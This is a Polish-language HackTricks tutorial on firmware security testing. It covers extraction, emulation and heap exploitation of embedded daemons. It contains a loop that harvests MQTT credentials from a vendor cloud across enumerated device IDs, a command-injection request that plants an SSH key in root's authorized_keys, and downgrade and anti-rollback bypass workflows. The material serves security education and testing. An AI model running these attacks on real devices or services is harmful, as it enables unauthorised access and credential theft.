# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware jest niezbędnym oprogramowaniem, które umożliwia urządzeniom prawidłowe działanie, zarządzając i ułatwiając komunikację między komponentami sprzętowymi a oprogramowaniem, z którym wchodzi w interakcję użytkownik. Jest przechowywany w pamięci trwałej, dzięki czemu urządzenie może uzyskać dostęp do kluczowych instrukcji od momentu włączenia zasilania, co prowadzi do uruchomienia systemu operacyjnego. Analiza i ewentualna modyfikacja firmware to kluczowy krok w identyfikowaniu luk bezpieczeństwa.

## **Gathering Information**

**Gathering information** to kluczowy początkowy etap zrozumienia budowy urządzenia i używanych przez nie technologii. Proces ten obejmuje zbieranie danych o:

- architekturze CPU i systemie operacyjnym, na którym działa
- szczegółach bootloadera
- układzie sprzętowym i datasheetach
- metrykach codebase i lokalizacjach source
- zewnętrznych bibliotekach i typach licencji
- historii aktualizacji i certyfikacjach regulacyjnych
- diagramach architektury i przepływu
- ocenach bezpieczeństwa i zidentyfikowanych lukach

W tym celu narzędzia **open-source intelligence (OSINT)** są nieocenione, podobnie jak analiza dostępnych komponentów open-source software poprzez ręczne i automatyczne procesy review. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują darmową static analysis, którą można wykorzystać do znajdowania potencjalnych problemów.

## **Acquiring the Firmware**

Pozyskanie firmware można przeprowadzić na różne sposoby, z których każdy ma własny poziom złożoności:

- **Bezpośrednio** ze źródła (developerzy, producenci)
- **Budując** go z dostarczonych instrukcji
- **Pobierając** z oficjalnych stron support
- Wykorzystując zapytania **Google dork** do znajdowania hostowanych plików firmware
- Uzyskując bezpośredni dostęp do **cloud storage**, z narzędziami takimi jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **updates** za pomocą technik man-in-the-middle
- **Ekstrahując** z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Sniffing** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i używając **hardcoded update endpoints**
- **Zrzucając** z bootloadera lub sieci
- **Usuwając i odczytując** układ pamięci, gdy wszystko inne zawiedzie, używając odpowiednich narzędzi hardware

### UART-only logs: force a root shell via U-Boot env in flash

Jeśli UART RX jest ignorowany (tylko logi), nadal możesz wymusić init shell przez **edytowanie blobu środowiska U-Boot** offline:

1. Zrób dump SPI flash przy użyciu klipsa SOIC-8 + programatora (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Znajdź partycję U-Boot env, edytuj `bootargs`, aby zawierało `init=/bin/sh`, i **przelicz CRC32 środowiska U-Boot** dla blobu.
3. Ponownie wgraj tylko partycję env i zrestartuj; shell powinien pojawić się na UART.

Jest to przydatne na urządzeniach embedded, gdzie shell bootloadera jest wyłączony, ale partycja env jest zapisywalna przez zewnętrzny dostęp do flash.

## Analyzing the firmware

Teraz, gdy **masz firmware**, musisz wydobyć z niego informacje, aby wiedzieć, jak z nim postępować. Różne narzędzia, których możesz do tego użyć:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli nie znajdziesz zbyt wiele tymi narzędziami, sprawdź **entropy** obrazu za pomocą `binwalk -E <bin>`. Jeśli entropy jest niskie, to raczej nie jest on encrypted. Jeśli entropy jest wysokie, prawdopodobnie jest encrypted (albo w jakiś sposób compressed).

Ponadto możesz użyć tych narzędzi, aby wyodrębnić **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Albo [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do zbadania pliku.

### Getting the Filesystem

Dzięki poprzednim opisanym narzędziom, takim jak `binwalk -ev <bin>`, powinieneś być w stanie **wyodrębnić filesystem**.\
Binwalk zwykle wyodrębnia go do **folderu o nazwie odpowiadającej typowi filesystem**, którym zazwyczaj jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Czasami binwalk **nie ma magic byte filesystem w swoich signatures**. W takich przypadkach użyj binwalk, aby **znaleźć offset filesystem** i carve skompresowany filesystem z binary oraz **ręcznie wyodrębnić** filesystem zgodnie z jego typem, używając kroków poniżej.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom następujące polecenie **dd** do wydzielenia systemu plików Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można też uruchomić poniższe polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki będą potem znajdować się w katalogu "`squashfs-root`".

- Pliki archiwum CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analizowanie Firmware

Gdy firmware zostanie pozyskany, kluczowe jest jego rozłożenie na części, aby zrozumieć jego strukturę i potencjalne podatności. Proces ten obejmuje użycie różnych narzędzi do analizy i wydobycia wartościowych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Zestaw poleceń służy do wstępnej inspekcji pliku binarnego (oznaczonego jako `<bin>`). Polecenia te pomagają identyfikować typy plików, wyodrębniać stringi, analizować dane binarne oraz rozumieć szczegóły partycji i filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić status szyfrowania obrazu, sprawdza się **entropy** za pomocą `binwalk -E <bin>`. Niska entropy sugeruje brak szyfrowania, podczas gdy wysoka entropy wskazuje na możliwe szyfrowanie lub kompresję.

Do wyodrębniania **embedded files** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie Filesystem

Używając `binwalk -ev <bin>`, można zwykle wyodrębnić filesystem, często do katalogu nazwanego zgodnie z typem filesystem (np. squashfs, ubifs). Jednak gdy **binwalk** nie potrafi rozpoznać typu filesystem z powodu brakujących magic bytes, konieczne jest ręczne wyodrębnienie. Polega to na użyciu `binwalk` do ustalenia offset filesystem, a następnie komendy `dd` do wycięcia filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Po wykonaniu tego, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), używa się różnych poleceń do ręcznego wyodrębnienia zawartości.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się wyszukiwanie błędów bezpieczeństwa. Zwraca się uwagę na niezabezpieczone network daemons, hardcoded credentials, API endpoints, funkcje serwera aktualizacji, niekompilowany kod, skrypty startowe oraz skompilowane binaria do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** pod kątem poświadczeń użytkowników
- certyfikaty SSL i klucze w **etc/ssl**
- pliki konfiguracyjne i skrypty pod kątem potencjalnych podatności
- osadzone binaria do dalszej analizy
- popularne web servery i binaria urządzeń IoT

Kilka narzędzi pomaga w wykrywaniu wrażliwych informacji i podatności w systemie plików:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania wrażliwych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) oraz [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych binariów

Zarówno kod źródłowy, jak i skompilowane binaria znalezione w systemie plików muszą zostać dokładnie przeanalizowane pod kątem podatności. Narzędzia takie jak **checksec.sh** dla binariów Unix oraz **PESecurity** dla binariów Windows pomagają identyfikować niezabezpieczone binaria, które można wykorzystać.

## Zbieranie cloud config i poświadczeń MQTT za pomocą pochodnych tokenów URL

Wiele hubów IoT pobiera swoją konfigurację dla konkretnego urządzenia z endpointu cloud, który wygląda tak:

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware możesz odkryć, że `<token>` jest lokalnie wyliczany z device ID przy użyciu hardcoded secret, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i reprezentowany jako uppercase hex

Taki projekt pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać cloud config, często ujawniając poświadczenia MQTT w plaintext oraz prefiksy topic.

Praktyczny workflow:

1) Wyodrębnij deviceId z UART boot logs

- Podłącz adapter UART 3.3V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Szukaj linii wypisujących wzorzec URL konfiguracji cloud i adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorithm token z firmware

- Załaduj binaria do Ghidra/radare2 i wyszukaj ścieżkę config ("/pf/") albo użycie MD5.
- Potwierdź algorithm (np. MD5(deviceId||STATIC_KEY)).
- Wyprowadź token w Bash i zamień digest na uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Zbierz cloud config i MQTT credentials

- Zbuduj URL i pobierz JSON za pomocą curl; sparsuj go z jq, aby wyciągnąć sekrety:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Nadużyj MQTT w postaci plaintext i słabych ACL tematów (jeśli są obecne)

- Użyj odzyskanych poświadczeń, aby zasubskrybować tematy maintenance i szukać wrażliwych zdarzeń:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeruj przewidywalne ID urządzeń (na dużą skalę, z upoważnieniem)

- Wiele ekosystemów osadza bajty OUI producenta / produktu / typu, po których następuje sekwencyjny sufiks.
- Możesz iterować po kandydackich ID, wyprowadzać tokeny i pobierać configi programowo:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Uwagi
- Zawsze uzyskaj wyraźną autoryzację przed próbą masowej enumeracji.
- Preferuj emulację lub analizę statyczną, aby odzyskać sekrety bez modyfikowania sprzętu docelowego, gdy to możliwe.


Proces emulacji firmware umożliwia **dynamic analysis** zarówno działania urządzenia, jak i pojedynczego programu. To podejście może napotkać problemy związane ze sprzętem lub zależnościami architektury, ale przeniesienie root filesystem lub konkretnych binariów na urządzenie o zgodnej architekturze i endianess, takie jak Raspberry Pi, albo do gotowej virtual machine, może ułatwić dalsze testy.

### Emulacja Pojedynczych Binary

Do analizy pojedynczych programów kluczowe jest określenie endianess programu oraz architektury CPU.

#### Przykład z Architektura MIPS

Aby emulować binary dla architektury MIPS, można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia emulacyjne:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Dla MIPS (big-endian) używa się `qemu-mips`, a dla binariów little-endian wyborem byłby `qemu-mipsel`.

#### ARM Architecture Emulation

Dla binariów ARM proces jest podobny, przy czym do emulacji wykorzystuje się emulator `qemu-arm`.

### Full System Emulation

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają pełną emulację firmware, automatyzując proces i wspierając dynamic analysis.

## Dynamic Analysis in Practice

Na tym etapie do analizy używa się albo rzeczywistego, albo emulowanego środowiska urządzenia. Kluczowe jest utrzymanie dostępu shell do OS i filesystem. Emulacja może nie odwzorowywać idealnie interakcji ze sprzętem, co czasem wymaga ponownego uruchomienia emulacji. Analiza powinna ponownie sprawdzić filesystem, wykorzystać ujawnione strony WWW i usługi sieciowe oraz zbadać podatności bootloader. Testy integralności firmware są krytyczne do wykrycia potencjalnych podatności backdoor.

## Runtime Analysis Techniques

Runtime analysis polega na interakcji z procesem lub binarium w jego środowisku działania, z użyciem narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpointów i identyfikowania podatności przez fuzzing oraz inne techniki.

Dla celów embedded bez pełnego debuggera, **skopiuj statycznie linkowany `gdbserver`** na urządzenie i dołącz się zdalnie:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Na hubach IoT stos RF jest często podzielony między **radio MCU** i proces użytkownika Linuxa. Przydatny workflow to zmapowanie ścieżki:

1. **RF frame** w eterze
2. **controller-side parser** na radio MCU
3. **serial/UART text or TLV protocol** przekazywany do Linuxa (na przykład `/dev/tty*`)
4. **application dispatcher** w głównym demonie
5. **protocol-specific handler / state machine**

Ta architektura tworzy dwa cele reverse engineering zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe do protokołu tekstowego, takiego jak `Group,Command,arg1,arg2,...`, odzyskaj:

- **message groups** i tablice dispatch
- które wiadomości mogą pochodzić z **network** versus z samego kontrolera
- dokładne pola dyskryminujące **manufacturer-specific** (na przykład Zigbee `manufacturer_code` i własny `cluster_command`)
- które handlery są osiągalne tylko podczas **commissioning**, discovery albo faz download firmware/model

W przypadku Zigbee przechwyć ruch parowania i sprawdź, czy target nadal polega na domyślnym **Link Key** `ZigBeeAlliance09`. Jeśli tak, podsłuch ruchu commissioning może ujawnić **Network Key**. Zigbee 3.0 install codes zmniejszają to ryzyko, więc zanotuj, czy testowane urządzenie faktycznie je wymusza.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands są często lepszym celem niż standardowe klastry, ponieważ trafiają do **custom parsing code** i wewnętrznych **FSMs** z mniej przetestowaną walidacją.

Praktyczny workflow:

- Reverse command dispatcher, aż znajdziesz **vendor-only handler**.
- Odtwórz tablice **FSM state**, **event**, **check**, **action** i **next-state**.
- Zidentyfikuj **transitional states**, które auto-advance, oraz gałęzie retry/error, które ostatecznie resetują lub zwalniają stan kontrolowany przez atakującego.
- Potwierdź, które legalne wymiany protokołu są wymagane, aby umieścić demona w podatnym stanie, zamiast zakładać, że buggy handler jest zawsze osiągalny.

Dla protokołów wrażliwych na timing, replay pakietów z frameworka Python może być zbyt wolny. Bardziej niezawodne podejście to emulacja legalnego urządzenia na realnym hardware (na przykład **nRF52840**) z vendor-grade stack, aby ujawnić poprawne **endpoints**, **attributes** i timing commissioning.

### Fragmented-download bug class in embedded daemons

Powtarzająca się klasa błędu firmware pojawia się w **fragmented blob/model/configuration downloads**:

1. **first fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Późniejsze fragmenty walidują tylko kontrolowane przez atakującego pola **packet-local**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzania względem **original allocated size**.

To pozwala atakującemu wysłać:

- pierwszy poprawny fragment z **małym** zadeklarowanym total size, aby wymusić małą alokację na heap,
- późniejszy fragment z **expected offset**, ale większym `chunk_len`,
- sfałszowany packet-local size, który spełnia świeże checki, a mimo to przepełnia oryginalnie zaalokowany bufor.

Gdy podatna ścieżka znajduje się za logiką commissioning, exploitation musi zawierać wystarczającą **device emulation**, aby doprowadzić target do oczekiwanego stanu model-download lub blob-download przed wysłaniem zniekształconych fragmentów.

### Protocol-driven `free()` triggers

W embedded daemons najłatwiejszym sposobem na wywołanie heap metadata exploitation często nie jest „czekaj na cleanup”, tylko **wymuś własne error handling protokołu**:

- Wyślij zniekształcone kolejne fragmenty, aby zepchnąć FSM w stany **retry** lub **error**.
- Przekrocz próg retry, aby daemon **reset context** i zwolnił uszkodzony bufor.
- Użyj tego przewidywalnego `free()`, aby wyzwolić primitives po stronie allocator before process crashes z niezwiązanych powodów.

Jest to szczególnie użyteczne przeciwko allocatorom typu **musl/uClibc/dlmalloc-like** w embedded Linux, gdzie uszkodzenie chunk metadata może zamienić unlink/unbin logic w write primitive. Stabilny wzorzec polega na uszkodzeniu **size field**, aby przekierować traversal allocatora do **fake chunks staged inside the overflowed buffer**, zamiast od razu nadpisywać prawdziwe bin pointers i powodować crash procesu.

## Binary Exploitation and Proof-of-Concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga głębokiego zrozumienia architektury targetu i programowania w językach niższego poziomu. Binary runtime protections w embedded systems są rzadkie, ale gdy występują, techniki takie jak Return Oriented Programming (ROP) mogą być konieczne.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc używa fastbins podobnych do glibc. Późniejsza duża alokacja może uruchomić `__malloc_consolidate()`, więc fake chunk musi przejść checki (rozsądny size, `fd = 0` i otaczające chunki widziane jako "in use").
- **Non-PIE binaries under ASLR:** jeśli ASLR jest włączony, ale główny binary jest **non-PIE**, adresy `.data/.bss` w binarce są stałe. Możesz targetować region, który już przypomina poprawny nagłówek heap chunk, aby trafić alokacją fastbin w **function pointer table**.
- **Parser-stopping NUL:** gdy JSON jest parsowany, `\x00` w payload może zatrzymać parsowanie, pozostawiając końcowe bajty kontrolowane przez atakującego dla stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain, który wywołuje `open("/proc/self/mem")`, `lseek()` i `write()`, może wstawić wykonywalny shellcode do znanego mappingu i przeskoczyć do niego.

## Prepared Operating Systems for Firmware Analysis

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają wstępnie skonfigurowane środowiska do firmware security testing, wyposażone w niezbędne narzędzia.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do pomocy w security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, dostarczając wstępnie skonfigurowane środowisko z załadowanymi wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): System operacyjny do embedded security testing oparty na Ubuntu 18.04, z preinstalowanymi narzędziami do firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Nawet gdy vendor implementuje cryptographic signature checks dla firmware images, **version rollback (downgrade) protection** jest często pomijana. Gdy boot- lub recovery-loader weryfikuje tylko signature za pomocą osadzonego public key, ale nie porównuje *version* (lub monotonic counter) flashowanego obrazu, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal ma ważny signature**, a tym samym przywrócić załatane podatności.

Typowy workflow ataku:

1. **Obtain an older signed image**
* Pobierz ją z publicznego portalu download vendora, CDN albo site support.
* Wyodrębnij ją z companion mobile/desktop applications (np. wewnątrz Android APK w `assets/firmware/`).
* Pobierz ją z repozytoriów third-party, takich jak VirusTotal, Internet archives, fora itd.
2. **Upload or serve the image to the device** przez dowolny exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, itd.
* Wiele consumer IoT devices wystawia *unauthenticated* HTTP(S) endpoints, które akceptują Base64-encoded firmware blobs, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
3. Po downgrade exploituj vulnerability, która została załatana w nowszym release (na przykład command-injection filter dodany później).
4. Opcjonalnie wgraj z powrotem najnowszy image albo wyłącz updates, aby uniknąć wykrycia po uzyskaniu persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (obniżonym) firmware parametr `md5` jest konkatenowany bezpośrednio do polecenia shell bez sanitization, co pozwala na injection dowolnych commands (tutaj – enabling SSH key-based root access). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, ale brak ochrony przed downgrade sprawia, że naprawa jest bez znaczenia.

### Extracting Firmware From Mobile Apps

Wielu vendorów dołącza pełne obrazy firmware do swoich companion mobile applications, aby app mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Takie pakiety są zwykle przechowywane nieszyfrowane w APK/APEX pod ścieżkami takimi jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra` albo nawet zwykły `unzip` pozwalają wyciągnąć signed images bez dotykania physical hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass anti-rollback tylko po stronie updatera w projektach A/B slot

Niektórzy vendorzy implementują anty-downgrade **ratchet**, ale tylko w logice *updatera* (na przykład procedura UDS przez CAN, komenda recovery albo agent OTA w userspace). Jeśli **bootloader** później sprawdza tylko podpis/CRC obrazu i ufa tabeli partycji albo metadanym slotu, ochrona przed rollback nadal może zostać obejślona.

Typowy słaby design:

- Metadane firmware zawierają zarówno opis wersji, jak i **security ratchet** / monotoniczny licznik.
- Updater porównuje ratchet obrazu z wartością zapisaną w persistent storage i odrzuca starsze podpisane obrazy.
- Bootloader **nie** parsuje tego ratchet i sprawdza tylko header, CRC oraz signature przed uruchomieniem wybranego slotu.
- Aktywacja slotu jest zapisywana osobno w tabeli partycji albo w per-slot generation counter i **nie jest kryptograficznie powiązana** z dokładnym firmware digest, który został zweryfikowany.

To tworzy primitive **validate-one-image / boot-another-image** w systemach dual-slot. Jeśli attacker może sprawić, że updater oznaczy slot B jako następny cel bootowania przy użyciu aktualnego podpisanego obrazu, a potem nadpisze slot B przed reboot, bootloader może nadal uruchomić downgraded image, bo ufa tylko już zatwierdzonym metadanym slotu.

Typowy pattern abuse:

1. Wgraj **current signed** firmware do pasywnego slotu i uruchom normalną procedurę validation/switch, aby układ oznaczył ten slot jako następny aktywny.
2. **Jeszcze nie rebootuj**. Wejdź ponownie w tej samej sesji w procedurę przygotowania/erase slotu.
3. Wykorzystaj stale boot-state albo stale logikę wyboru slotu, tak aby updater wymazał **ten sam fizyczny slot**, który właśnie został promowany.
4. Zapisz **starszy, ale nadal podpisany** firmware do tego slotu.
5. Pomiń procedurę validation, która egzekwuje ratchet, i zrób reboot bezpośrednio.
6. Bootloader wybiera promowany slot, sprawdza tylko signature/integrity i uruchamia stary obraz.

Na co zwracać uwagę przy reverse in A/B update implementations:

- Wybór slotu wyprowadzany z **boot-time flags**, które nie są odświeżane po udanym przełączeniu.
- Procedura w stylu `prepare_passive_slot()`, która wymazuje slot na podstawie stalego stanu zamiast **current committed layout**.
- Funkcja w stylu `part_write_layout()`, która tylko zwiększa **generation counter** / active flag i nie zapisuje zweryfikowanego image hash.
- Sprawdzenia ratchet zaimplementowane w userspace albo w kodzie updatera, ale **nie** w ROM / bootloader / secure boot stages.
- Procedury erase lub recovery, które pozostawiają slot oznaczony jako bootable nawet po tym, jak jego zawartość została usunięta i nadpisana.

### Checklist for Assessing Update Logic

* Czy transport/autoryzacja *update endpoint* są odpowiednio zabezpieczone (TLS + authentication)?
* Czy urządzenie porównuje **version numbers** albo **monotonic anti-rollback counter** przed flashing?
* Czy obraz jest weryfikowany w secure boot chain (np. signatures sprawdzane przez kod ROM)?
* Czy **bootloader egzekwuje ten sam ratchet** co updater, zamiast sprawdzać tylko signature/CRC?
* Czy metadane aktywacji slotu są **powiązane z zweryfikowanym firmware digest/version**, czy slot może zostać zmodyfikowany po promocji?
* Po udanym switchu slotu czy urządzenie jest zmuszane do reboot, czy późniejsze rutyny update/erase są nadal osiągalne w tej samej sesji?
* Czy kod userland wykonuje dodatkowe sanity checks (np. dozwolony partition map, model number)?
* Czy *partial* lub *backup* update flows używają tej samej logiki validation?

> 💡  Jeśli brakuje któregokolwiek z powyższych elementów, platforma prawdopodobnie jest podatna na rollback attacks.

## Vulnerable firmware to practice

Aby ćwiczyć wykrywanie vulnerabilities w firmware, użyj poniższych vulnerable firmware projects jako punktu startowego.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
